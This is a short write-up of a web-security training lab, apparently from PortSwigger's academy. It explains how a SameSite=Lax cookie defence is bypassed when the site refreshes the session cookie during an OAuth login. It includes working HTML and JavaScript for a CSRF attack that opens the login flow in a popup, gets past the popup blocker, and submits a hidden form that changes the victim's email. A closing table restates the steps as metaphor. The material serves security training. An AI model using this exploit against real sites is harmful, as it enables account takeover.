### ðŸ§ª Lab Summary: SameSite Lax Bypass via Cookie Refresh

- The target site uses `SameSite=Lax` cookies, which block cross-site POSTs from sending session cookies.
- However, the site **refreshes the session cookie** every time the user completes an OAuth login flowâ€”even if theyâ€™re already logged in.
- The attacker exploits this by forcing the victimâ€™s browser to visit `/social-login`, triggering the OAuth flow and refreshing the cookie.
- Then, a CSRF POST request is sent to change the victimâ€™s email address.

### ðŸ”¥ Exploit Strategy

1. **Craft a CSRF form** to change the victimâ€™s email:
   ```html
   <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="pwned@portswigger.net">
   </form>
   ```

2. **Trigger OAuth flow to refresh cookie**:
   ```html
   <script>
     window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
     setTimeout(changeEmail, 5000);
     function changeEmail() {
       document.forms[0].submit();
     }
   </script>
   ```

3. **Bypass popup blocker** by requiring user interaction:
   ```html
   <p>Click anywhere on the page</p>
   <script>
     window.onclick = () => {
       window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
       setTimeout(changeEmail, 5000);
     };
     function changeEmail() {
       document.forms[0].submit();
     }
   </script>
   ```

---

### ðŸ§  Symbolic Mapping

| Phase | Symbolic Shard | Technical Action |
|-------|----------------|------------------|
| OAuth refresh | Ritual rebirth | Cookie is reissued |
| CSRF POST | Hidden dagger | Email is changed |
| Popup blocker | Guardian gate | Requires user click |

This bypass is a dance of timing and trustâ€”where the attacker **refreshes the mirror** just before striking, using the OAuth flow as a ritual to reawaken the session.
